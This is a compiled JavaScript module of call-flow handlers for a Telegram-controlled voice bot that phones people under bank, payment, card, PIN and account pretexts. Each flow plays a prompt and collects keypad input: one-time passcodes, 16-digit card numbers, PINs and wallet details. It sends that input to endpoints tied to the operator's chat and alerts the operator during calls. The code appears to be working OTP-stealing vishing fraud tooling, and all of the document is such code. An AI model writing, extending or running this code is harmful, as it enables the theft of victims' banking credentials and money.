"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.pgpFlow = exports.pinFlow = exports.cardFlow = exports.accountFlow = exports.payFlow = exports.bankFlow = void 0;
const __1 = require("..");
const uuid_1 = require("uuid");
const languages_1 = require("../languages");
const bankFlow = (dtmf, res, language, chatId, step, destination, otpLength) => __awaiter(void 0, void 0, void 0, function* () {
    if (dtmf && dtmf === '1') {
        yield __1.bot.telegram.sendMessage(Number(chatId), `<b>On call</b> (${destination}) 🤳🏽`, {
            parse_mode: 'HTML',
        });
        return res.json({
            id: (0, uuid_1.v4)(),
            title: `call BANK FLOW - ${chatId}`,
            record: false,
            steps: [
                {
                    id: (0, uuid_1.v4)(),
                    action: 'say',
                    options: {
                        payload: (0, languages_1.getLangDTMFFlow)({ dtmf, language, step }),
                        language,
                        voice: 'female',
                    },
                    onKeypressGoto: 'nextStepGoto',
                    onKeypressVar: 'dtmf',
                    endKey: '#',
                    maxNumKeys: Number(otpLength),
                },
                {
                    id: (0, uuid_1.v4)(),
                    action: 'pause',
                    options: {
                        length: 5,
                    },
                    onKeypressGoto: 'nextStepGoto',
                    onKeypressVar: 'dtmf',
                    endKey: '#',
                    maxNumKeys: Number(otpLength),
                },
                {
                    id: 'nextStepGoto',
                    action: 'fetchCallFlow',
                    options: {
                        url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}?otpLength=${otpLength}`,
                    },
                },
            ],
        });
    }
    else if (dtmf && dtmf === '2') {
        yield __1.bot.telegram.sendMessage(Number(chatId), `<b>On call</b> (${destination}) 🤳🏽`, {
            parse_mode: 'HTML',
        });
        return res.json({
            id: (0, uuid_1.v4)(),
            title: `call BANK FLOW - ${chatId}`,
            record: false,
            steps: [
                {
                    id: (0, uuid_1.v4)(),
                    action: 'say',
                    options: {
                        payload: (0, languages_1.getLangDTMFFlow)({ dtmf, language, step }),
                        language,
                        voice: 'female',
                    },
                    onKeypressGoto: 'nextStepGoto',
                    onKeypressVar: 'dtmf',
                    endKey: '#',
                    maxNumKeys: Number(otpLength),
                },
                {
                    id: (0, uuid_1.v4)(),
                    action: 'pause',
                    options: {
                        length: 5,
                    },
                    onKeypressGoto: 'nextStepGoto',
                    onKeypressVar: 'dtmf',
                    endKey: '#',
                    maxNumKeys: Number(otpLength),
                },
                {
                    id: 'nextStepGoto',
                    action: 'fetchCallFlow',
                    options: {
                        url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}?otpLength=${otpLength}`,
                    },
                },
            ],
        });
    }
    else if (dtmf && dtmf === '3') {
        return res.json({
            id: (0, uuid_1.v4)(),
            title: `call BANK FLOW - ${chatId}`,
            record: false,
            steps: [
                {
                    id: (0, uuid_1.v4)(),
                    action: 'say',
                    options: {
                        payload: (0, languages_1.getLangDTMFFlow)({ dtmf, language, step }),
                        language,
                        voice: 'female',
                    },
                    onKeypressGoto: 'nextStepGoto',
                    onKeypressVar: 'dtmf',
                    endKey: '#',
                    maxNumKeys: Number(otpLength),
                },
                {
                    id: (0, uuid_1.v4)(),
                    action: 'pause',
                    options: {
                        length: 5,
                    },
                    onKeypressGoto: 'nextStepGoto',
                    onKeypressVar: 'dtmf',
                    endKey: '#',
                    maxNumKeys: Number(otpLength),
                },
                {
                    id: 'nextStepGoto',
                    action: 'fetchCallFlow',
                    options: {
                        url: `${process.env.ENDPOINT_URL}/calls/dtmf/${language}/${step}/${chatId}?otpLength=${otpLength}`,
                    },
                },
            ],
        });
    }
    else if (dtmf && dtmf === '*') {
        return res.json({
            id: (0, uuid_1.v4)(),
            title: `call BANK FLOW - ${chatId}`,
            record: false,
            steps: [
                {
                    id: (0, uuid_1.v4)(),
                    action: 'say',
                    options: {
                        payload: (0, languages_1.getLangDTMFFlow)({ dtmf, language, step }),
                        language,
                        voice: 'female',
                    },
                },
            ],
        });
    }
    else {
        return res.json({
            id: (0, uuid_1.v4)(),
            title: `call BANK FLOW - ${chatId}`,
            record: false,
            steps: [
                {
                    id: (0, uuid_1.v4)(),
                    action: 'say',
                    options: {
                        payload: (0, languages_1.getLangDTMFFlow)({ dtmf, language, step }),
                        language,
                        voice: 'female',
                    },
                    onKeypressGoto: 'nextStepGoto',
                    onKeypressVar: 'dtmf',
                    endKey: '#',
                    maxNumKeys: Number(otpLength),
                },
                {
                    id: (0, uuid_1.v4)(),
                    action: 'pause',
                    options: {
                        length: 5,
                    },
                    onKeypressGoto: 'nextStepGoto',
                    onKeypressVar: 'dtmf',
                    endKey: '#',
                    maxNumKeys: Number(otpLength),
                },
                {
                    id: 'nextStepGoto',
                    action: 'fetchCallFlow',
                    options: {
                        url: `${process.env.ENDPOINT_URL}/calls/dtmf/${language}/${step}/${chatId}?otpLength=${otpLength}`,
                    },
                },
            ],
        });
    }
});
exports.bankFlow = bankFlow;
const payFlow = (dtmf, res, language, chatId, step, destination, otpLength, wallet) => __awaiter(void 0, void 0, void 0, function* () {
    if (dtmf && dtmf === '1') {
        yield __1.bot.telegram.sendMessage(Number(chatId), `<b>On call</b> (${destination}) 🤳🏽`, {
            parse_mode: 'HTML',
        });
        return res.json({
            id: (0, uuid_1.v4)(),
            title: `call PAY FLOW - ${chatId}`,
            record: false,
            steps: [
                {
                    id: (0, uuid_1.v4)(),
                    action: 'say',
                    options: {
                        payload: (0, languages_1.getLangDTMFFlow)({ dtmf, language, step, wallet }),
                        language,
                        voice: 'female',
                    },
                    onKeypressGoto: 'nextStepGoto',
                    onKeypressVar: 'dtmf',
                    endKey: '#',
                    maxNumKeys: Number(otpLength),
                },
                {
                    id: (0, uuid_1.v4)(),
                    action: 'pause',
                    options: {
                        length: 5,
                    },
                    onKeypressGoto: 'nextStepGoto',
                    onKeypressVar: 'dtmf',
                    endKey: '#',
                    maxNumKeys: Number(otpLength),
                },
                {
                    id: 'nextStepGoto',
                    action: 'fetchCallFlow',
                    options: {
                        url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}?otpLength=${otpLength}`,
                    },
                },
            ],
        });
    }
    else if (dtmf && dtmf === '2') {
        yield __1.bot.telegram.sendMessage(Number(chatId), `<b>On call</b> (${destination}) 🤳🏽`, {
            parse_mode: 'HTML',
        });
        return res.json({
            id: (0, uuid_1.v4)(),
            title: `call PAY FLOW - ${chatId}`,
            record: false,
            steps: [
                {
                    id: (0, uuid_1.v4)(),
                    action: 'say',
                    options: {
                        payload: (0, languages_1.getLangDTMFFlow)({ dtmf, language, step, wallet }),
                        language,
                        voice: 'female',
                    },
                    onKeypressGoto: 'nextStepGoto',
                    onKeypressVar: 'dtmf',
                    endKey: '#',
                    maxNumKeys: Number(otpLength),
                },
                {
                    id: (0, uuid_1.v4)(),
                    action: 'pause',
                    options: {
                        length: 5,
                    },
                    onKeypressGoto: 'nextStepGoto',
                    onKeypressVar: 'dtmf',
                    endKey: '#',
                    maxNumKeys: Number(otpLength),
                },
                {
                    id: 'nextStepGoto',
                    action: 'fetchCallFlow',
                    options: {
                        url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}?otpLength=${otpLength}`,
                    },
                },
            ],
        });
    }
    else if (dtmf && dtmf === '3') {
        return res.json({
            id: (0, uuid_1.v4)(),
            title: `call PAY FLOW - ${chatId}`,
            record: false,
            steps: [
                {
                    id: (0, uuid_1.v4)(),
                    action: 'say',
                    options: {
                        payload: (0, languages_1.getLangDTMFFlow)({ dtmf, language, step, wallet }),
                        language,
                        voice: 'female',
                    },
                    onKeypressGoto: 'nextStepGoto',
                    onKeypressVar: 'dtmf',
                    endKey: '#',
                    maxNumKeys: Number(otpLength),
                },
                {
                    id: (0, uuid_1.v4)(),
                    action: 'pause',
                    options: {
                        length: 5,
                    },
                    onKeypressGoto: 'nextStepGoto',
                    onKeypressVar: 'dtmf',
                    endKey: '#',
                    maxNumKeys: Number(otpLength),
                },
                {
                    id: 'nextStepGoto',
                    action: 'fetchCallFlow',
                    options: {
                        url: `${process.env.ENDPOINT_URL}/calls/dtmf/${language}/${step}/${chatId}?wallet=${wallet === null || wallet === void 0 ? void 0 : wallet.replace(/\s/g, '').toLowerCase()}?otpLength=${otpLength}`,
                    },
                },
            ],
        });
    }
    else if (dtmf && dtmf === '*') {
        return res.json({
            id: (0, uuid_1.v4)(),
            title: `call PAY FLOW - ${chatId}`,
            record: false,
            steps: [
                {
                    id: (0, uuid_1.v4)(),
                    action: 'say',
                    options: {
                        payload: (0, languages_1.getLangDTMFFlow)({ dtmf, language, step, wallet }),
                        language,
                        voice: 'female',
                    },
                },
            ],
        });
    }
    else {
        return res.json({
            id: (0, uuid_1.v4)(),
            title: `call PAY FLOW - ${chatId}`,
            record: false,
            steps: [
                {
                    id: (0, uuid_1.v4)(),
                    action: 'say',
                    options: {
                        payload: (0, languages_1.getLangDTMFFlow)({ dtmf, language, step, wallet }),
                        language,
                        voice: 'female',
                    },
                    onKeypressGoto: 'nextStepGoto',
                    onKeypressVar: 'dtmf',
                    endKey: '#',
                    maxNumKeys: Number(otpLength),
                },
                {
                    id: (0, uuid_1.v4)(),
                    action: 'pause',
                    options: {
                        length: 5,
                    },
                    onKeypressGoto: 'nextStepGoto',
                    onKeypressVar: 'dtmf',
                    endKey: '#',
                    maxNumKeys: Number(otpLength),
                },
                {
                    id: 'nextStepGoto',
                    action: 'fetchCallFlow',
                    options: {
                        url: `${process.env.ENDPOINT_URL}/calls/dtmf/${language}/${step}/${chatId}?wallet=${wallet === null || wallet === void 0 ? void 0 : wallet.replace(/\s/g, '').toLowerCase()}?otpLength=${otpLength}`,
                    },
                },
            ],
        });
    }
});
exports.payFlow = payFlow;
const accountFlow = (dtmf, res, language, chatId, step, destination, otpLength, askCardInfo) => __awaiter(void 0, void 0, void 0, function* () {
    if (dtmf && dtmf === '1') {
        yield __1.bot.telegram.sendMessage(Number(chatId), `<b>On call</b> (${destination}) 🤳🏽`, {
            parse_mode: 'HTML',
        });
        return res.json({
            id: (0, uuid_1.v4)(),
            title: `call PAY FLOW - ${chatId}`,
            record: false,
            steps: [
                {
                    id: (0, uuid_1.v4)(),
                    action: 'say',
                    options: {
                        payload: (0, languages_1.getLangDTMFFlow)({ dtmf, language, step }),
                        language,
                        voice: 'female',
                    },
                    onKeypressGoto: 'nextStepGoto',
                    onKeypressVar: 'dtmf',
                    endKey: '#',
                    maxNumKeys: Number(otpLength),
                },
                {
                    id: (0, uuid_1.v4)(),
                    action: 'pause',
                    options: {
                        length: 5,
                    },
                    onKeypressGoto: 'nextStepGoto',
                    onKeypressVar: 'dtmf',
                    endKey: '#',
                    maxNumKeys: Number(otpLength),
                },
                {
                    id: 'nextStepGoto',
                    action: 'fetchCallFlow',
                    options: {
                        url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}?otpLength=${otpLength}&askCardInfo=${askCardInfo}`,
                    },
                },
            ],
        });
    }
    else if (dtmf && dtmf === '2') {
        yield __1.bot.telegram.sendMessage(Number(chatId), `<b>On call</b> (${destination}) 🤳🏽`, {
            parse_mode: 'HTML',
        });
        return res.json({
            id: (0, uuid_1.v4)(),
            title: `call PAY FLOW - ${chatId}`,
            record: false,
            steps: [
                {
                    id: (0, uuid_1.v4)(),
                    action: 'say',
                    options: {
                        payload: (0, languages_1.getLangDTMFFlow)({ dtmf, language, step }),
                        language,
                        voice: 'female',
                    },
                    onKeypressGoto: 'nextStepGoto',
                    onKeypressVar: 'dtmf',
                    endKey: '#',
                    maxNumKeys: Number(otpLength),
                },
                {
                    id: (0, uuid_1.v4)(),
                    action: 'pause',
                    options: {
                        length: 5,
                    },
                    onKeypressGoto: 'nextStepGoto',
                    onKeypressVar: 'dtmf',
                    endKey: '#',
                    maxNumKeys: Number(otpLength),
                },
                {
                    id: 'nextStepGoto',
                    action: 'fetchCallFlow',
                    options: {
                        url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}?otpLength=${otpLength}&askCardInfo=${askCardInfo}`,
                    },
                },
            ],
        });
    }
    else if (dtmf && dtmf === '3') {
        return res.json({
            id: (0, uuid_1.v4)(),
            title: `call PAY FLOW - ${chatId}`,
            record: false,
            steps: [
                {
                    id: (0, uuid_1.v4)(),
                    action: 'say',
                    options: {
                        payload: (0, languages_1.getLangDTMFFlow)({ dtmf, language, step }),
                        language,
                        voice: 'female',
                    },
                    onKeypressGoto: 'nextStepGoto',
                    onKeypressVar: 'dtmf',
                    endKey: '#',
                    maxNumKeys: Number(otpLength),
                },
                {
                    id: (0, uuid_1.v4)(),
                    action: 'pause',
                    options: {
                        length: 5,
                    },
                    onKeypressGoto: 'nextStepGoto',
                    onKeypressVar: 'dtmf',
                    endKey: '#',
                    maxNumKeys: Number(otpLength),
                },
                {
                    id: 'nextStepGoto',
                    action: 'fetchCallFlow',
                    options: {
                        url: `${process.env.ENDPOINT_URL}/calls/dtmf/${language}/${step}/${chatId}?otpLength=${otpLength}&askCardInfo=${askCardInfo}`,
                    },
                },
            ],
        });
    }
    else if (dtmf && dtmf === '*') {
        return res.json({
            id: (0, uuid_1.v4)(),
            title: `call PAY FLOW - ${chatId}`,
            record: false,
            steps: [
                {
                    id: (0, uuid_1.v4)(),
                    action: 'say',
                    options: {
                        payload: (0, languages_1.getLangDTMFFlow)({ dtmf, language, step }),
                        language,
                        voice: 'female',
                    },
                },
            ],
        });
    }
    else {
        return res.json({
            id: (0, uuid_1.v4)(),
            title: `call PAY FLOW - ${chatId}`,
            record: false,
            steps: [
                {
                    id: (0, uuid_1.v4)(),
                    action: 'say',
                    options: {
                        payload: (0, languages_1.getLangDTMFFlow)({ dtmf, language, step }),
                        language,
                        voice: 'female',
                    },
                    onKeypressGoto: 'nextStepGoto',
                    onKeypressVar: 'dtmf',
                    endKey: '#',
                    maxNumKeys: Number(otpLength),
                },
                {
                    id: (0, uuid_1.v4)(),
                    action: 'pause',
                    options: {
                        length: 5,
                    },
                    onKeypressGoto: 'nextStepGoto',
                    onKeypressVar: 'dtmf',
                    endKey: '#',
                    maxNumKeys: Number(otpLength),
                },
                {
                    id: 'nextStepGoto',
                    action: 'fetchCallFlow',
                    options: {
                        url: `${process.env.ENDPOINT_URL}/calls/dtmf/${language}/${step}/${chatId}?otpLength=${otpLength}&askCardInfo=${askCardInfo}`,
                    },
                },
            ],
        });
    }
});
exports.accountFlow = accountFlow;
const cardFlow = (dtmf, res, language, chatId, step, destination, cardType) => __awaiter(void 0, void 0, void 0, function* () {
    if (dtmf && dtmf === '1') {
        yield __1.bot.telegram.sendMessage(Number(chatId), `<b>On call</b> (${destination}) 🤳🏽`, {
            parse_mode: 'HTML',
        });
        return res.json({
            id: (0, uuid_1.v4)(),
            title: `call CARD FLOW - ${chatId}`,
            record: false,
            steps: [
                {
                    id: (0, uuid_1.v4)(),
                    action: 'say',
                    options: {
                        payload: (0, languages_1.getLangDTMFFlow)({ dtmf, language, step, cardType }),
                        language,
                        voice: 'female',
                    },
                    onKeypressGoto: 'nextStepGoto',
                    onKeypressVar: 'dtmf',
                    endKey: '#',
                    maxNumKeys: 16,
                },
                {
                    id: (0, uuid_1.v4)(),
                    action: 'pause',
                    options: {
                        length: 5,
                    },
                    onKeypressGoto: 'nextStepGoto',
                    onKeypressVar: 'dtmf',
                    endKey: '#',
                    maxNumKeys: 16,
                },
                {
                    id: 'nextStepGoto',
                    action: 'fetchCallFlow',
                    options: {
                        url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}?cardType=${cardType}`,
                    },
                },
            ],
        });
    }
    else if (dtmf && dtmf === '2') {
        yield __1.bot.telegram.sendMessage(Number(chatId), `<b>On call</b> (${destination}) 🤳🏽`, {
            parse_mode: 'HTML',
        });
        return res.json({
            id: (0, uuid_1.v4)(),
            title: `call CARD FLOW - ${chatId}`,
            record: false,
            steps: [
                {
                    id: (0, uuid_1.v4)(),
                    action: 'say',
                    options: {
                        payload: (0, languages_1.getLangDTMFFlow)({ dtmf, language, step, cardType }),
                        language,
                        voice: 'female',
                    },
                    onKeypressGoto: 'nextStepGoto',
                    onKeypressVar: 'dtmf',
                    endKey: '#',
                    maxNumKeys: 16,
                },
                {
                    id: (0, uuid_1.v4)(),
                    action: 'pause',
                    options: {
                        length: 5,
                    },
                    onKeypressGoto: 'nextStepGoto',
                    onKeypressVar: 'dtmf',
                    endKey: '#',
                    maxNumKeys: 16,
                },
                {
                    id: 'nextStepGoto',
                    action: 'fetchCallFlow',
                    options: {
                        url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}?cardType=${cardType}`,
                    },
                },
            ],
        });
    }
    else if (dtmf && dtmf === '3') {
        return res.json({
            id: (0, uuid_1.v4)(),
            title: `call CARD FLOW - ${chatId}`,
            record: false,
            steps: [
                {
                    id: (0, uuid_1.v4)(),
                    action: 'say',
                    options: {
                        payload: (0, languages_1.getLangDTMFFlow)({ dtmf, language, step, cardType }),
                        language,
                        voice: 'female',
                    },
                    onKeypressGoto: 'nextStepGoto',
                    onKeypressVar: 'dtmf',
                    endKey: '#',
                    maxNumKeys: 16,
                },
                {
                    id: (0, uuid_1.v4)(),
                    action: 'pause',
                    options: {
                        length: 5,
                    },
                    onKeypressGoto: 'nextStepGoto',
                    onKeypressVar: 'dtmf',
                    endKey: '#',
                    maxNumKeys: 16,
                },
                {
                    id: 'nextStepGoto',
                    action: 'fetchCallFlow',
                    options: {
                        url: `${process.env.ENDPOINT_URL}/calls/dtmf/${language}/${step}/${chatId}?cardType=${cardType}`,
                    },
                },
            ],
        });
    }
    else if (dtmf && dtmf === '*') {
        return res.json({
            id: (0, uuid_1.v4)(),
            title: `call PAY FLOW - ${chatId}`,
            record: false,
            steps: [
                {
                    id: (0, uuid_1.v4)(),
                    action: 'say',
                    options: {
                        payload: (0, languages_1.getLangDTMFFlow)({ dtmf, language, step, cardType }),
                        language,
                        voice: 'female',
                    },
                },
            ],
        });
    }
    else {
        return res.json({
            id: (0, uuid_1.v4)(),
            title: `call CARD FLOW - ${chatId}`,
            record: false,
            steps: [
                {
                    id: (0, uuid_1.v4)(),
                    action: 'say',
                    options: {
                        payload: (0, languages_1.getLangDTMFFlow)({ dtmf, language, step, cardType }),
                        language,
                        voice: 'female',
                    },
                    onKeypressGoto: 'nextStepGoto',
                    onKeypressVar: 'dtmf',
                    endKey: '#',
                    maxNumKeys: 16,
                },
                {
                    id: (0, uuid_1.v4)(),
                    action: 'pause',
                    options: {
                        length: 5,
                    },
                    onKeypressGoto: 'nextStepGoto',
                    onKeypressVar: 'dtmf',
                    endKey: '#',
                    maxNumKeys: 16,
                },
                {
                    id: 'nextStepGoto',
                    action: 'fetchCallFlow',
                    options: {
                        url: `${process.env.ENDPOINT_URL}/calls/dtmf/${language}/${step}/${chatId}?cardType=${cardType}`,
                    },
                },
            ],
        });
    }
});
exports.cardFlow = cardFlow;
const pinFlow = (dtmf, res, language, chatId, step, destination, pinType) => __awaiter(void 0, void 0, void 0, function* () {
    if (dtmf && dtmf === '1') {
        yield __1.bot.telegram.sendMessage(Number(chatId), `<b>On call</b> (${destination}) 🤳🏽`, {
            parse_mode: 'HTML',
        });
        return res.json({
            id: (0, uuid_1.v4)(),
            title: `call CARD FLOW - ${chatId}`,
            record: false,
            steps: [
                {
                    id: (0, uuid_1.v4)(),
                    action: 'say',
                    options: {
                        payload: (0, languages_1.getLangDTMFFlow)({ dtmf, language, step, pinType }),
                        language,
                        voice: 'female',
                    },
                    onKeypressGoto: 'nextStepGoto',
                    onKeypressVar: 'dtmf',
                    endKey: '#',
                    maxNumKeys: 8,
                },
                {
                    id: (0, uuid_1.v4)(),
                    action: 'pause',
                    options: {
                        length: 5,
                    },
                    onKeypressGoto: 'nextStepGoto',
                    onKeypressVar: 'dtmf',
                    endKey: '#',
                    maxNumKeys: 8,
                },
                {
                    id: 'nextStepGoto',
                    action: 'fetchCallFlow',
                    options: {
                        url: `${process.env.ENDPOINT_URL}/calls/pins/${step}/${chatId}/${language}?pinType=${pinType}`,
                    },
                },
            ],
        });
    }
    else if (dtmf && dtmf === '2') {
        yield __1.bot.telegram.sendMessage(Number(chatId), `<b>On call</b> (${destination}) 🤳🏽`, {
            parse_mode: 'HTML',
        });
        return res.json({
            id: (0, uuid_1.v4)(),
            title: `call CARD FLOW - ${chatId}`,
            record: false,
            steps: [
                {
                    id: (0, uuid_1.v4)(),
                    action: 'say',
                    options: {
                        payload: (0, languages_1.getLangDTMFFlow)({ dtmf, language, step, pinType }),
                        language,
                        voice: 'female',
                    },
                    onKeypressGoto: 'nextStepGoto',
                    onKeypressVar: 'dtmf',
                    endKey: '#',
                    maxNumKeys: 8,
                },
                {
                    id: (0, uuid_1.v4)(),
                    action: 'pause',
                    options: {
                        length: 5,
                    },
                    onKeypressGoto: 'nextStepGoto',
                    onKeypressVar: 'dtmf',
                    endKey: '#',
                    maxNumKeys: 8,
                },
                {
                    id: 'nextStepGoto',
                    action: 'fetchCallFlow',
                    options: {
                        url: `${process.env.ENDPOINT_URL}/calls/pins/${step}/${chatId}/${language}?pinType=${pinType}`,
                    },
                },
            ],
        });
    }
    else if (dtmf && dtmf === '3') {
        return res.json({
            id: (0, uuid_1.v4)(),
            title: `call CARD FLOW - ${chatId}`,
            record: false,
            steps: [
                {
                    id: (0, uuid_1.v4)(),
                    action: 'say',
                    options: {
                        payload: (0, languages_1.getLangDTMFFlow)({ dtmf, language, step, pinType }),
                        language,
                        voice: 'female',
                    },
                    onKeypressGoto: 'nextStepGoto',
                    onKeypressVar: 'dtmf',
                    endKey: '#',
                    maxNumKeys: 8,
                },
                {
                    id: (0, uuid_1.v4)(),
                    action: 'pause',
                    options: {
                        length: 5,
                    },
                    onKeypressGoto: 'nextStepGoto',
                    onKeypressVar: 'dtmf',
                    endKey: '#',
                    maxNumKeys: 8,
                },
                {
                    id: 'nextStepGoto',
                    action: 'fetchCallFlow',
                    options: {
                        url: `${process.env.ENDPOINT_URL}/calls/pins/${language}/${step}/${chatId}?pinType=${pinType}`,
                    },
                },
            ],
        });
    }
    else {
        return res.json({
            id: (0, uuid_1.v4)(),
            title: `call CARD FLOW - ${chatId}`,
            record: false,
            steps: [
                {
                    id: (0, uuid_1.v4)(),
                    action: 'say',
                    options: {
                        payload: (0, languages_1.getLangDTMFFlow)({ dtmf, language, step, pinType }),
                        language,
                        voice: 'female',
                    },
                    onKeypressGoto: 'nextStepGoto',
                    onKeypressVar: 'dtmf',
                    endKey: '#',
                    maxNumKeys: 8,
                },
                {
                    id: (0, uuid_1.v4)(),
                    action: 'pause',
                    options: {
                        length: 5,
                    },
                    onKeypressGoto: 'nextStepGoto',
                    onKeypressVar: 'dtmf',
                    endKey: '#',
                    maxNumKeys: 8,
                },
                {
                    id: 'nextStepGoto',
                    action: 'fetchCallFlow',
                    options: {
                        url: `${process.env.ENDPOINT_URL}/calls/pins/${language}/${step}/${chatId}?pinType=${pinType}`,
                    },
                },
            ],
        });
    }
});
exports.pinFlow = pinFlow;
const pgpFlow = (dtmf, res, language, chatId, step, destination, transferNumber, institutionName, from) => __awaiter(void 0, void 0, void 0, function* () {
    if (dtmf && dtmf === '1') {
        yield __1.bot.telegram.sendMessage(Number(chatId), `<b>On call</b> (${destination}) 🤳🏽`, {
            parse_mode: 'HTML',
        });
        return res.json({
            id: (0, uuid_1.v4)(),
            title: `${chatId} - Forward call to ${transferNumber}`,
            record: false,
            steps: [
                {
                    id: (0, uuid_1.v4)(),
                    action: 'transfer',
                    options: {
                        source: from,
                        destination: transferNumber,
                    },
                },
            ],
        });
    }
    else {
        return res.json({
            id: (0, uuid_1.v4)(),
            title: `call CARD FLOW - ${chatId}`,
            record: false,
            steps: [
                {
                    id: (0, uuid_1.v4)(),
                    action: 'say',
                    options: {
                        payload: (0, languages_1.getLangDTMFFlow)({ dtmf, language, step, institutionName }),
                        language,
                        voice: 'female',
                    },
                    onKeypressGoto: 'nextStepGoto',
                    onKeypressVar: 'dtmf',
                    endKey: '#',
                    maxNumKeys: 1,
                },
                {
                    id: (0, uuid_1.v4)(),
                    action: 'pause',
                    options: {
                        length: 5,
                    },
                    onKeypressGoto: 'nextStepGoto',
                    onKeypressVar: 'dtmf',
                    endKey: '#',
                    maxNumKeys: 1,
                },
                {
                    id: 'nextStepGoto',
                    action: 'fetchCallFlow',
                    options: {
                        url: `${process.env.ENDPOINT_URL}/calls/dtmf/${language}/${step}/${chatId}?transferNumber=${transferNumber}&from=${from}`,
                    },
                },
            ],
        });
    }
});
exports.pgpFlow = pgpFlow;
